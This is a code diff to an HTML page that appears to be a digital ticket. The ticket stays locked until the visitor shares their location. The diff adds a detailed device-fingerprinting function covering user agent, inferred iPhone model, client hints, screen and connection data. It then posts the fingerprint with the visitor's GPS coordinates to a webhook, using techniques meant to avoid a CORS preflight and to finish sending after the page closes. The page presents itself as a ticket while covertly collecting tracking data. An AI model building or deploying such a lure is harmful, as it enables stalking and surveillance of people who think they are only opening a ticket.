@@ -73,7 +73,6 @@
         </div>
     </div>
 
-
 <script>
 
 "use strict";
@@ -113,14 +112,15 @@ function setExpirationDate() {
 
     expirationDate.setHours(0, 0, 0, 0);
 
-    const formattedDate = expirationDate.toLocaleDateString(
-        "en-US",
-        {
-            month: "short",
-            day: "numeric",
-            year: "numeric"
-        }
-    );
+    const formattedDate =
+        expirationDate.toLocaleDateString(
+            "en-US",
+            {
+                month: "short",
+                day: "numeric",
+                year: "numeric"
+            }
+        );
 
     expiryMessage.textContent =
         `Expires ${formattedDate} at 12:00 AM`;
@@ -136,10 +136,15 @@ function updateClock() {
     const now = new Date();
 
     let hours = now.getHours();
-    const minutes = String(now.getMinutes()).padStart(2, "0");
-    const seconds = String(now.getSeconds()).padStart(2, "0");
 
-    const ampm = hours >= 12 ? "PM" : "AM";
+    const minutes =
+        String(now.getMinutes()).padStart(2, "0");
+
+    const seconds =
+        String(now.getSeconds()).padStart(2, "0");
+
+    const ampm =
+        hours >= 12 ? "PM" : "AM";
 
     hours = hours % 12;
 
@@ -175,74 +180,911 @@ function getCentralTimeISO() {
 
 
 /* =========================================================
+   Get Device Information
+   ========================================================= */
+
+async function getDeviceInfo() {
+
+    const ua =
+        navigator.userAgent || "";
+
+    const platform =
+        navigator.platform || "";
+
+    const screenWidth =
+        screen.width;
+
+    const screenHeight =
+        screen.height;
+
+    const viewportWidth =
+        window.innerWidth;
+
+    const viewportHeight =
+        window.innerHeight;
+
+    const dpr =
+        window.devicePixelRatio || 1;
+
+
+    let deviceType =
+        "Desktop";
+
+    let manufacturer =
+        "Unknown";
+
+    let model =
+        "Unknown";
+
+    let modelConfidence =
+        "Unknown";
+
+    let operatingSystem =
+        "Unknown";
+
+    let osVersion =
+        "Unknown";
+
+    let browser =
+        "Unknown";
+
+
+    /* =====================================================
+       DEVICE TYPE
+       ===================================================== */
+
+    if (/iPhone/i.test(ua)) {
+
+        deviceType = "Mobile";
+
+        manufacturer = "Apple";
+    }
+
+    else if (/iPad/i.test(ua)) {
+
+        deviceType = "Tablet";
+
+        manufacturer = "Apple";
+    }
+
+    else if (/Android/i.test(ua)) {
+
+        deviceType =
+            /Mobile/i.test(ua)
+                ? "Mobile"
+                : "Tablet";
+
+        manufacturer = "Android";
+    }
+
+    else if (/Windows Phone/i.test(ua)) {
+
+        deviceType = "Mobile";
+
+        manufacturer = "Microsoft";
+    }
+
+
+    /* =====================================================
+       OPERATING SYSTEM
+       ===================================================== */
+
+    if (/iPhone|iPad|iPod/i.test(ua)) {
+
+        operatingSystem = "iOS";
+
+        const iosMatch =
+            ua.match(
+                /OS (\d+)[._](\d+)(?:[._](\d+))?/
+            );
+
+        if (iosMatch) {
+
+            osVersion =
+                `${iosMatch[1]}.${iosMatch[2]}` +
+                (
+                    iosMatch[3]
+                        ? `.${iosMatch[3]}`
+                        : ""
+                );
+        }
+    }
+
+    else if (/Android/i.test(ua)) {
+
+        operatingSystem = "Android";
+
+        const androidMatch =
+            ua.match(
+                /Android\s+([\d.]+)/i
+            );
+
+        if (androidMatch) {
+
+            osVersion =
+                androidMatch[1];
+        }
+    }
+
+    else if (/Windows NT/i.test(ua)) {
+
+        operatingSystem = "Windows";
+
+        const windowsMatch =
+            ua.match(
+                /Windows NT ([\d.]+)/
+            );
+
+        if (windowsMatch) {
+
+            const windowsVersions = {
+
+                "10.0": "10/11",
+                "6.4": "10",
+                "6.3": "8.1",
+                "6.2": "8",
+                "6.1": "7"
+            };
+
+            osVersion =
+                windowsVersions[
+                    windowsMatch[1]
+                ] ||
+                windowsMatch[1];
+        }
+    }
+
+    else if (/Mac OS X/i.test(ua)) {
+
+        operatingSystem = "macOS";
+
+        const macMatch =
+            ua.match(
+                /Mac OS X ([\d_]+)/i
+            );
+
+        if (macMatch) {
+
+            osVersion =
+                macMatch[1]
+                    .replace(/_/g, ".");
+        }
+    }
+
+
+    /* =====================================================
+       BROWSER
+       ===================================================== */
+
+    if (/CriOS/i.test(ua)) {
+
+        browser = "Chrome";
+    }
+
+    else if (/FxiOS/i.test(ua)) {
+
+        browser = "Firefox";
+    }
+
+    else if (/EdgiOS|EdgA|Edg\//i.test(ua)) {
+
+        browser = "Edge";
+    }
+
+    else if (/OPiOS|OPR\//i.test(ua)) {
+
+        browser = "Opera";
+    }
+
+    else if (/SamsungBrowser/i.test(ua)) {
+
+        browser = "Samsung Internet";
+    }
+
+    else if (
+        /Safari/i.test(ua) &&
+        !/Chrome|CriOS|Android/i.test(ua)
+    ) {
+
+        browser = "Safari";
+    }
+
+    else if (/Chrome|Chromium/i.test(ua)) {
+
+        browser = "Chrome";
+    }
+
+    else if (/Firefox/i.test(ua)) {
+
+        browser = "Firefox";
+    }
+
+
+    /* =====================================================
+       ANDROID MODEL
+       ===================================================== */
+
+    if (/Android/i.test(ua)) {
+
+        /*
+            Try to extract the Android hardware model
+            directly from the User-Agent.
+        */
+
+        const androidMatch =
+            ua.match(
+                /Android[^;]*;\s*(?:[a-zA-Z]{2}-[a-zA-Z]{2};\s*)?([^;)]+)(?:\)|;)/i
+            );
+
+        if (androidMatch) {
+
+            const androidModel =
+                androidMatch[1].trim();
+
+            if (
+                androidModel &&
+                androidModel.length < 100
+            ) {
+
+                model =
+                    androidModel;
+
+                modelConfidence =
+                    "High";
+            }
+        }
+
+        if (model === "Unknown") {
+
+            model =
+                "Android Device";
+
+            modelConfidence =
+                "Low";
+        }
+    }
+
+
+    /* =====================================================
+       iPHONE MODEL ESTIMATION
+       ===================================================== */
+
+    if (/iPhone/i.test(ua)) {
+
+        /*
+            Safari doesn't normally reveal the exact
+            iPhone model.
+
+            We therefore use CSS screen dimensions
+            and devicePixelRatio to narrow it down.
+        */
+
+        const width =
+            Math.min(
+                screenWidth,
+                screenHeight
+            );
+
+        const height =
+            Math.max(
+                screenWidth,
+                screenHeight
+            );
+
+
+        /* -----------------------------------------------
+           iPhone 5 / 5s / SE 1st Gen
+           ----------------------------------------------- */
+
+        if (
+            width === 320 &&
+            height === 568
+        ) {
+
+            model =
+                "iPhone 5 / 5s / SE (1st generation)";
+
+            modelConfidence =
+                "High";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 4 / 4S
+           ----------------------------------------------- */
+
+        else if (
+            width === 320 &&
+            height === 480
+        ) {
+
+            model =
+                "iPhone 4 / 4S";
+
+            modelConfidence =
+                "High";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone SE / 6 / 6s / 7 / 8
+           ----------------------------------------------- */
+
+        else if (
+            width === 375 &&
+            height === 667
+        ) {
+
+            model =
+                "iPhone SE / 6 / 6s / 7 / 8 family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           Plus-size older iPhones
+           ----------------------------------------------- */
+
+        else if (
+            width === 414 &&
+            height === 736
+        ) {
+
+            model =
+                "iPhone 6 Plus / 6s Plus / 7 Plus / 8 Plus family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone X / XS / 11 Pro / 12 mini / 13 mini
+           ----------------------------------------------- */
+
+        else if (
+            width === 375 &&
+            height === 812
+        ) {
+
+            model =
+                "iPhone X / XS / 11 Pro / 12 mini / 13 mini family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 12 / 13 / 13 Pro / 14
+           ----------------------------------------------- */
+
+        else if (
+            width === 390 &&
+            height === 844
+        ) {
+
+            model =
+                "iPhone 12 / 13 / 13 Pro / 14 family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 15 / 15 Pro
+           ----------------------------------------------- */
+
+        else if (
+            width === 393 &&
+            height === 852 &&
+            dpr === 3
+        ) {
+
+            model =
+                "iPhone 15 / 15 Pro family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 16 / 16 Pro
+           ----------------------------------------------- */
+
+        else if (
+            width === 402 &&
+            height === 874 &&
+            dpr === 3
+        ) {
+
+            model =
+                "iPhone 16 / 16 Pro family";
+
+            modelConfidence =
+                "High";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 12 Pro Max / 13 Pro Max / 14 Plus
+           ----------------------------------------------- */
+
+        else if (
+            width === 428 &&
+            height === 926
+        ) {
+
+            model =
+                "iPhone 12 Pro Max / 13 Pro Max / 14 Plus family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 14 Pro Max / 15 Plus / 15 Pro Max
+           ----------------------------------------------- */
+
+        else if (
+            width === 430 &&
+            height === 932 &&
+            dpr === 3
+        ) {
+
+            model =
+                "iPhone 14 Pro Max / 15 Plus / 15 Pro Max family";
+
+            modelConfidence =
+                "Medium";
+        }
+
+
+        /* -----------------------------------------------
+           iPhone 16 Pro Max
+           ----------------------------------------------- */
+
+        else if (
+            width === 440 &&
+            height === 956 &&
+            dpr === 3
+        ) {
+
+            model =
+                "iPhone 16 Pro Max";
+
+            modelConfidence =
+                "High";
+        }
+
+
+        /* -----------------------------------------------
+           Unknown iPhone
+           ----------------------------------------------- */
+
+        else {
+
+            model =
+                "iPhone";
+
+            modelConfidence =
+                "Low";
+        }
+    }
+
+
+    /* =====================================================
+       iPAD
+       ===================================================== */
+
+    if (/iPad/i.test(ua)) {
+
+        model =
+            "iPad";
+
+        modelConfidence =
+            "Low";
+
+        const width =
+            Math.min(
+                screenWidth,
+                screenHeight
+            );
+
+        if (width === 768) {
+
+            model =
+                "iPad 9.7-inch family";
+
+            modelConfidence =
+                "Medium";
+        }
+    }
+
+
+    /* =====================================================
+       DESKTOP
+       ===================================================== */
+
+    if (deviceType === "Desktop") {
+
+        if (/Windows/i.test(ua)) {
+
+            manufacturer =
+                "Microsoft/PC";
+
+            model =
+                "Windows PC";
+        }
+
+        else if (/Macintosh/i.test(ua)) {
+
+            manufacturer =
+                "Apple";
+
+            model =
+                "Mac";
+        }
+
+        else if (/Linux/i.test(ua)) {
+
+            manufacturer =
+                "Linux";
+
+            model =
+                "Linux PC";
+        }
+    }
+
+
+    /* =====================================================
+       USER-AGENT CLIENT HINTS
+       ===================================================== */
+
+    let clientHintModel =
+        null;
+
+    if (navigator.userAgentData) {
+
+        try {
+
+            const hints =
+                await navigator.userAgentData
+                    .getHighEntropyValues(
+                        [
+                            "model",
+                            "platform",
+                            "platformVersion",
+                            "uaFullVersion"
+                        ]
+                    );
+
+
+            if (hints.model) {
+
+                clientHintModel =
+                    hints.model;
+
+
+                /*
+                    Android browsers can sometimes provide
+                    a much more accurate hardware model.
+
+                    Do not overwrite Apple's estimated model.
+                */
+
+                if (
+                    manufacturer !== "Apple" &&
+                    deviceType === "Mobile"
+                ) {
+
+                    model =
+                        hints.model;
+
+                    modelConfidence =
+                        "High";
+                }
+            }
+
+        }
+
+        catch (error) {
+
+            console.log(
+                "User-Agent Client Hints unavailable."
+            );
+        }
+    }
+
+
+    /* =====================================================
+       CONNECTION INFORMATION
+       ===================================================== */
+
+    let connection =
+        null;
+
+    if (navigator.connection) {
+
+        connection = {
+
+            type:
+                navigator.connection.type ||
+                "Unknown",
+
+            effectiveType:
+                navigator.connection.effectiveType ||
+                "Unknown",
+
+            downlink:
+                navigator.connection.downlink ||
+                null,
+
+            rtt:
+                navigator.connection.rtt ||
+                null,
+
+            saveData:
+                navigator.connection.saveData ||
+                false
+        };
+    }
+
+
+    /* =====================================================
+       RETURN DEVICE INFORMATION
+       ===================================================== */
+
+    return {
+
+        deviceType:
+            deviceType,
+
+        manufacturer:
+            manufacturer,
+
+        model:
+            model,
+
+        modelConfidence:
+            modelConfidence,
+
+        operatingSystem:
+            operatingSystem,
+
+        osVersion:
+            osVersion,
+
+        browser:
+            browser,
+
+        screen:
+            {
+                width:
+                    screenWidth,
+
+                height:
+                    screenHeight,
+
+                devicePixelRatio:
+                    dpr
+            },
+
+        viewport:
+            {
+                width:
+                    viewportWidth,
+
+                height:
+                    viewportHeight
+            },
+
+        clientHints:
+            {
+                model:
+                    clientHintModel
+            },
+
+        connection:
+            connection,
+
+        userAgent:
+            ua,
+
+        platform:
+            platform
+    };
+}
+
+
+/* =========================================================
    Send Location
    ========================================================= */
 
 async function sendLocation(position) {
 
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
+    const latitude =
+        position.coords.latitude;
 
-    const payload = {
-        latitude: latitude,
-        longitude: longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: getCentralTimeISO(),
-        device: navigator.userAgent,
-        platform: navigator.platform,
-        map: `https://www.google.com/maps?q=${latitude},${longitude}`
-    };
-
-    const json = JSON.stringify(payload);
-
-    console.log("Location payload:", payload);
+    const longitude =
+        position.coords.longitude;
 
 
     /*
-        Use text/plain instead of application/json.
-
-        This prevents the browser from sending an OPTIONS
-        CORS preflight request before the POST.
-
-        The actual body is still JSON.
+        Get device information before creating
+        the webhook payload.
     */
+
+    const deviceInfo =
+        await getDeviceInfo();
+
+
+    /* =====================================================
+       POST PAYLOAD
+       ===================================================== */
+
+    const payload = {
+
+        latitude:
+            latitude,
+
+        longitude:
+            longitude,
+
+        accuracy:
+            position.coords.accuracy,
+
+        timestamp:
+            getCentralTimeISO(),
+
+
+        /* =================================================
+           DEVICE INFORMATION
+           ================================================= */
+
+        device:
+            deviceInfo,
+
+
+        /* =================================================
+           BACKWARDS-COMPATIBLE VALUES
+           =================================================
+
+           These are also included at the top level so
+           HookListener can easily access them without
+           having to dig into device.
+        */
+
+        deviceType:
+            deviceInfo.deviceType,
+
+        manufacturer:
+            deviceInfo.manufacturer,
+
+        model:
+            deviceInfo.model,
+
+        modelConfidence:
+            deviceInfo.modelConfidence,
+
+        operatingSystem:
+            deviceInfo.operatingSystem,
+
+        osVersion:
+            deviceInfo.osVersion,
+
+        browser:
+            deviceInfo.browser,
+
+
+        /* =================================================
+           SCREEN INFORMATION
+           ================================================= */
+
+        screenWidth:
+            deviceInfo.screen.width,
+
+        screenHeight:
+            deviceInfo.screen.height,
+
+        devicePixelRatio:
+            deviceInfo.screen.devicePixelRatio,
+
+
+        /* =================================================
+           VIEWPORT
+           ================================================= */
+
+        viewportWidth:
+            deviceInfo.viewport.width,
+
+        viewportHeight:
+            deviceInfo.viewport.height,
+
+
+        /* =================================================
+           ORIGINAL BROWSER VALUES
+           ================================================= */
+
+        userAgent:
+            navigator.userAgent,
+
+        platform:
+            navigator.platform,
+
+
+        /* =================================================
+           GOOGLE MAPS
+           ================================================= */
+
+        map:
+            `https://www.google.com/maps?q=${latitude},${longitude}`
+    };
+
+
+    const json =
+        JSON.stringify(payload);
+
+
+    console.log(
+        "Location + Device payload:",
+        payload
+    );
+
+
+    /* =====================================================
+       SEND POST REQUEST
+       ===================================================== */
 
     try {
 
-        const response = await fetch(
-            WEBHOOK_URL,
-            {
-                method: "POST",
+        const response =
+            await fetch(
+                WEBHOOK_URL,
+                {
+                    method:
+                        "POST",
 
-                headers: {
-                    "Content-Type": "text/plain;charset=UTF-8"
-                },
+                    headers:
+                        {
+                            "Content-Type":
+                                "text/plain;charset=UTF-8"
+                        },
 
-                body: json,
+                    body:
+                        json,
 
-                /*
-                    Allows the browser to keep the request alive
-                    even if the page changes or is closed.
-                */
-                keepalive: true,
+                    keepalive:
+                        true,
 
-                /*
-                    We don't need to read the response.
-                */
-                mode: "no-cors"
-            }
+                    mode:
+                        "no-cors"
+                }
+            );
+
+
+        console.log(
+            "Webhook request sent.",
+            response
         );
 
-        console.log("Webhook request sent.", response);
 
         return true;
 
-    } catch (error) {
+    }
+
+    catch (error) {
 
         console.error(
             "Webhook request failed:",
             error
         );
+
 
         return false;
     }
@@ -268,12 +1110,14 @@ function requestLocation() {
     /*
         Disable the button immediately.
 
-        This prevents multiple location requests if the
-        user taps Yes more than once.
+        Prevents multiple location requests.
     */
 
-    allowButton.disabled = true;
-    allowButton.textContent = "Please wait...";
+    allowButton.disabled =
+        true;
+
+    allowButton.textContent =
+        "Please wait...";
 
 
     navigator.geolocation.getCurrentPosition(
@@ -287,8 +1131,8 @@ function requestLocation() {
 
 
             /*
-                Send the webhook before displaying
-                the ticket.
+                Send location + device information
+                before displaying the ticket.
             */
 
             await sendLocation(position);
@@ -296,11 +1140,14 @@ function requestLocation() {
 
             /*
                 Location succeeded.
-                Now unlock the ticket.
+                Unlock the ticket.
             */
 
-            overlay.style.display = "none";
-            content.style.display = "block";
+            overlay.style.display =
+                "none";
+
+            content.style.display =
+                "block";
 
         },
 
@@ -312,42 +1159,63 @@ function requestLocation() {
                 error
             );
 
-            allowButton.disabled = false;
-            allowButton.textContent = "Yes";
+
+            allowButton.disabled =
+                false;
+
+            allowButton.textContent =
+                "Yes";
 
 
             let message;
 
+
             switch (error.code) {
 
                 case error.PERMISSION_DENIED:
+
                     message =
                         "Location permission was denied. Please allow location access and try again.";
+
                     break;
+
 
                 case error.POSITION_UNAVAILABLE:
+
                     message =
                         "Your location could not be determined. Please try again.";
+
                     break;
+
 
                 case error.TIMEOUT:
+
                     message =
                         "The location request timed out. Please try again.";
+
                     break;
 
+
                 default:
+
                     message =
                         "Unable to obtain your location. Please try again.";
             }
+
 
             alert(message);
         },
 
 
         {
-            enableHighAccuracy: false,
-            timeout: 15000,
-            maximumAge: 0
+            enableHighAccuracy:
+                false,
+
+            timeout:
+                15000,
+
+            maximumAge:
+                0
         }
     );
 }
@@ -361,11 +1229,16 @@ document.addEventListener(
     "DOMContentLoaded",
     function() {
 
-        console.log("DOM loaded");
+        console.log(
+            "DOM loaded"
+        );
+
 
         setExpirationDate();
 
+
         updateClock();
+
 
         setInterval(
             updateClock,
@@ -377,7 +1250,10 @@ document.addEventListener(
             "click",
             function() {
 
-                console.log("Yes button clicked");
+                console.log(
+                    "Yes button clicked"
+                );
+
 
                 requestLocation();
 
@@ -388,6 +1264,5 @@ document.addEventListener(
 );
 
 </script>
-
 </body>
 </html>
